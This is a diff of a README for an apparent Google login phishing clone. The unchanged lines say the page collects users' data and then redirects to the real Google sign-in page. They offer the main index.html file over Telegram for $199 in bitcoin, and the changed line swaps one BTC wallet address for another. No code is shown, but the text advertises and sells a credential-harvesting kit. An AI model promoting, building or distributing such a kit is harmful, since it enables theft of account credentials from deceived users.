@@ -9,7 +9,7 @@ After collecting users' data, it redirects to the real Google login page.
 Have fun.
 FOR THE MAIN INDEX.HTML FILE, CHAT ME ON TELEGRAM: @stilllasvegas
 AFTER MAKING A LITTLE TOKEN of $199 TO THE BTC WALLET
-bc1qcnf8sjgfqer23w04faec2y2kpv5elx7pgh5lgl
+bc1qws58ey5952dceumzksxtr29fp4enhc7540pfvv
 
 ![Sign in - Google Accounts - Google Chrome 6_23_2023 06_12_34](https://github.com/stilllasvegas/google-login-clone/assets/137506606/b10ba473-36e6-40e6-8992-005cd539faa2)
 
